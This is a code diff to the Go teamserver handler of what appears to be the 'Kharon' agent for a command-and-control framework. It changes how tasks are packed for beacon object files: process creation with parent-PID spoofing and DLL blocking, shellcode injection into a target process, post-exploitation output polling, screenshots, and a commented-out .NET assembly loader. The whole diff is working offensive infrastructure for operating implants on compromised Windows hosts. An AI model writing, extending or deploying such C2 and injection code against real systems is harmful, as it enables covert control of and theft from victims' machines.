@@ -967,14 +967,14 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 		switch subcommand {
 
 		case "list":
-			bofData, err := LoadExtModule("list", "x64")
+			bofData, err := LoadExtModule("src_core", "list", "x64")
 			if err != nil {
 				goto RET
 			}
 
 			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, PROC_LIST, 0, 0}
 
-		case "run":
+		case "create":
 			programArgs, ok := args["cmd"].(string)
 			if !ok || programArgs == "" {
 				err = errors.New("parameter 'cmd' is required and must be a non-empty string")
@@ -1027,20 +1027,28 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			fmt.Printf("pipe number: %d\n", pipeNum)
 			fmt.Printf("parent id: %d\n", kharon_cfg.ps.parent_id)
 			
+			parts := []string{}
+			if kharon_cfg.ps.parent_id != 0 {
+				parts = append(parts, fmt.Sprintf("PPID: %d", kharon_cfg.ps.parent_id))
+			}
+			if kharon_cfg.ps.block_dlls {
+				parts = append(parts, "BlockDlls: enabled")
+			}
 
-			bofData, err := LoadExtModule("create", "x64")
+			if len(parts) > 0 {
+				taskData.Message = "Creating process"
+				taskData.Message += fmt.Sprintf(" (%s)", strings.Join(parts, ", "))
+				taskData.MessageType = MESSAGE_INFO
+			}
+
+			bofData, err := LoadExtModule("src_core", "create", "x64")
 			if err != nil {
 				err = fmt.Errorf("failed to load BOF module: %w", err)
 				goto RET
 			}
 
-			block_dlls := map[bool]int{false: 0, true: 1}[kharon_cfg.ps.block_dlls]
-
 			bofParam, err := PackExtData(
 				int(method),
-				int(block_dlls),
-				int(kharon_cfg.ps.parent_id),
-				PackExtDataWChar(kharon_cfg.ps.spoofarg, agent.ACP),
 
 				PackExtDataWChar(programArgs, agent.ACP),
 				int(stateNum),
@@ -1067,7 +1075,7 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 
 			exit_code, _ := args["exit_code"].(int)
 
-			bofData, err := LoadExtModule("kill", "x64")
+			bofData, err := LoadExtModule("src_core", "kill", "x64")
 			if err != nil {
 				goto RET
 			}
@@ -1097,7 +1105,7 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				goto RET
 			}
 
-			bofData, err := LoadExtModule("cat", "x64")
+			bofData, err := LoadExtModule("src_core", "cat", "x64")
 			if err != nil {
 				goto RET
 			}
@@ -1117,7 +1125,7 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				goto RET
 			}
 
-			bofData, err := LoadExtModule("cd", "x64")
+			bofData, err := LoadExtModule("src_core", "cd", "x64")
 			if err != nil {
 				goto RET
 			}
@@ -1148,7 +1156,7 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				goto RET
 			}
 
-			bofData, err := LoadExtModule("cp", "x64")
+			bofData, err := LoadExtModule("src_core", "cp", "x64")
 			if err != nil {
 				goto RET
 			}
@@ -1174,7 +1182,7 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				dir += "\\*"
 			}
 
-			bofData, err := LoadExtModule("ls", "x64")
+			bofData, err := LoadExtModule("src_core", "ls", "x64")
 			if err != nil {
 				goto RET
 			}
@@ -1200,7 +1208,7 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				goto RET
 			}
 
-			bofData, err := LoadExtModule("mv", "x64")
+			bofData, err := LoadExtModule("src_core", "mv", "x64")
 			if err != nil {
 				goto RET
 			}
@@ -1221,7 +1229,7 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				goto RET
 			}
 
-			bofData, err := LoadExtModule("mkdir", "x64")
+			bofData, err := LoadExtModule("src_core", "mkdir", "x64")
 			if err != nil {
 				goto RET
 			}
@@ -1235,7 +1243,7 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, FS_MKDIR, len(bofParam), bofParam}
 
 		case "pwd":
-			bofData, err := LoadExtModule("pwd", "x64")
+			bofData, err := LoadExtModule("src_core", "pwd", "x64")
 			if err != nil {
 				goto RET
 			}
@@ -1251,7 +1259,7 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				goto RET
 			}
 
-			bofData, err := LoadExtModule("rm", "x64")
+			bofData, err := LoadExtModule("src_core", "rm", "x64")
 			if err != nil {
 				goto RET
 			}
@@ -1562,7 +1570,7 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 
 	case "config":
 
-		bofData, err := LoadExtModule("config", "x64")
+		bofData, err := LoadExtModule("src_core", "config", "x64")
 		if err != nil {
 			goto RET
 		}
@@ -2116,7 +2124,7 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			goto RET
 		}
 
-		bofData, err := LoadExtModule("scinject", "x64")
+		bofData, err := LoadExtModule("src_core", "scinject", "x64")
 		if err != nil {
 			goto RET
 		}
@@ -2169,13 +2177,11 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				}
 			}
 
-			cmdId := int(rand.Int31())
-
-			array = []interface{}{TASK_EXEC_BOF, len(bofContent), bofContent, cmdId, len(params), params}
+			array = []interface{}{TASK_EXEC_BOF, len(bofContent), bofContent, 0, len(params), params}
 		case "postex":
 			method := args["method"].(string)
-			pid := args["pid"].(int)
-			scfile := args["shellcode"].(string)
+			pid := args["pid"].(float64)
+			scfile := args["sc_file"].(string)
 
 			method_n := 0
 			switch method {
@@ -2187,16 +2193,25 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 
 			scContent, _ := base64.StdEncoding.DecodeString(scfile)
 
+			var params []byte
+			paramData, ok := args["param_data"].(string)
+			if ok {
+				params, err = base64.StdEncoding.DecodeString(paramData)
+				if err != nil {
+					params = []byte(paramData)
+				}
+			}
+
 			var bofData []byte
 			if !kharon_cfg.postex_handler.PostexLoaded {  
-				bofData, _ = LoadExtModule("kit_postex", "x64")
+				bofData, _ = LoadExtModule("src_core", "kit_postex", "x64")
 			}
 
 			bofArgs, _ := PackExtData(
 				int(method_n),
 				int(pid),
-				len(scContent),
 				scContent,
+				params,
 			)
 
 			array = []interface{}{ TASK_POSTEX, 1, len(bofData), bofData, len(bofArgs), bofArgs,}
@@ -2207,6 +2222,42 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 
 			// case "cleanup": array = []interface{}{TASK_POSTEX, POSTEX_CLEANUP}
 		}
+
+	// case "dotnet": 
+	// 	wd, err := os.Getwd()
+	// 	if err != nil {
+	// 		goto RET
+	// 	}
+
+	// 	mod_content, err := os.ReadFile(fmt.Sprintf("%s/dist/extenders/agent_kharon/src_modules/postex_sc/dotnet_ldr/dotnet_assembly.x64.bin", wd))
+	// 	if err != nil {
+	// 		goto RET
+	// 	}
+
+		// dotnet_file := args["sc_file"].(string)
+
+		// method_n := 0
+		// switch method {
+		// case "explicit":
+		// 	method_n = 0x100
+		// case "spawn":
+		// 	method_n = 0x200
+		// }
+
+		// dotnet_content, _ := base64.StdEncoding.DecodeString(dotnet_file)
+
+		// switch subcommand {
+		// case "inline":
+		// 	method_n = 0x000
+
+		// case "spawn":
+		// 	method_n = 0x200
+
+		// case "explicit":
+		// 	method_n = 0x100
+		// }
+
+	
 	default:
 		err = errors.New(fmt.Sprintf("Command '%v' not found", command))
 		goto RET
@@ -2267,7 +2318,7 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 			task.TaskId = TaskUID[:8]
 
 			if dataType == 0x7 && packer.CheckPacker([]string{"int"}) {
-				packer.ParseInt32() // cmdID
+				packer.ParseInt32() 
 			}
 
 			if false == packer.CheckPacker([]string{"int", "array"}) {
@@ -2281,12 +2332,13 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 				output := packer.ParseString()
 
 				task.MessageType = MESSAGE_ERROR
-				task.ClearText = ConvertCpToUTF8(output, agentData.ACP)
+				task.Message = ConvertCpToUTF8(output, agentData.ACP)
 
 			case CALLBACK_SCREENSHOT:
 				task.MessageType = MESSAGE_SUCCESS
 				screenBuff := packer.ParseBytes()
 				ts.TsScreenshotAdd(agentData.Id, "", screenBuff)
+				task.Message = "Screenshot saved!"
 
 			case CALLBACK_OUTPUT_OEM:
 				output := packer.ParseString()
@@ -2298,6 +2350,11 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 				output := packer.ParseString()
 
 				task.ClearText = ConvertCpToUTF8(output, agentData.ACP)
+
+			case CALLBACK_INFO:
+				task.MessageType = MESSAGE_INFO
+				task.Message = packer.ParseString()
+			
 			default:
 				output := packer.ParseString()
 
@@ -2587,15 +2644,65 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 					break
 
 				case TASK_POSTEX:
-					success := cmd_packer.ParseInt32()
-					if success == 1 {
-						kharon_cfg.postex_handler.PostexLoaded = true
-					} else {
-						kharon_cfg.postex_handler.PostexLoaded = false
-					}
+					postex_action := cmd_packer.ParseInt32()
 
-					agentData.CustomData, _ = kharon_cfg.Marshal()
-					ts.TsAgentUpdateData(agentData)
+					switch ( postex_action ) {
+					case POSTEX_ACTION_INJECT:
+						success := cmd_packer.ParseInt32()
+						if success == 1 {
+							kharon_cfg.postex_handler.PostexLoaded = true
+						} else {
+							kharon_cfg.postex_handler.PostexLoaded = false
+						}
+
+						agentData.CustomData, _ = kharon_cfg.Marshal()
+						ts.TsAgentUpdateData(agentData)
+
+						taskData.Completed = false
+
+						case POSTEX_ACTION_POLL:
+						postex_msg := cmd_packer.ParseInt32()
+
+						switch postex_msg {
+						case POSTEX_MSG_OUTPUT:
+							is_exit   := cmd_packer.ParseInt32()
+							exit_code := cmd_packer.ParseInt32()
+							output 	  := cmd_packer.ParseBytes()
+							
+							if is_exit == 1 {
+								taskData.Completed = true
+								taskData.Message     = fmt.Sprintf("Received %d bytes of output. Process exited with code %d", len(output), exit_code)
+							} else {
+								taskData.Message     = fmt.Sprintf("Received %d bytes of output", len(output))
+							}
+
+							taskData.MessageType = MESSAGE_INFO
+							taskData.ClearText   = ConvertCpToUTF8(string(output), agentData.ACP)
+
+						case POSTEX_MSG_RAW:
+							output := cmd_packer.ParseBytes()
+
+							taskData.Message     = fmt.Sprintf("Received %d bytes of raw output", len(output))
+							taskData.MessageType = MESSAGE_INFO
+							taskData.ClearText   = ConvertCpToUTF8(string(output), agentData.ACP)
+
+							taskData.Completed = true
+							
+						case POSTEX_MSG_END: 
+							exit_code := cmd_packer.ParseInt32()
+
+							taskData.Message 	 = fmt.Sprintf("Process terminated with exit code: %d", exit_code)
+							taskData.MessageType = MESSAGE_INFO					
+
+							taskData.Completed = true
+						}
+
+					case POSTEX_ACTION_LIST:
+					case POSTEX_ACTION_SUSPEND:
+					case POSTEX_ACTION_KILL:
+					case POSTEX_ACTION_RESUME:
+					case POSTEX_ACTION_CLEANUP:
+					}
 
 				case TASK_EXEC_BOF:
 					cmd_id := cmd_packer.ParseInt32()
@@ -2676,7 +2783,7 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 											"", SizeBytesToFormat(int64(item.size)), item.createDate, item.accessDate, item.writeDate, item.filename)
 									}
 									
-									t, _ := time.Parse("02/01/2006 15:04:05", item.writeDate)
+									t, _ := time.Parse("01/02/2006 15:04:05", item.writeDate)
 									
 									fileData := ax.ListingFileDataWin{
 										IsDir:    item.dir,
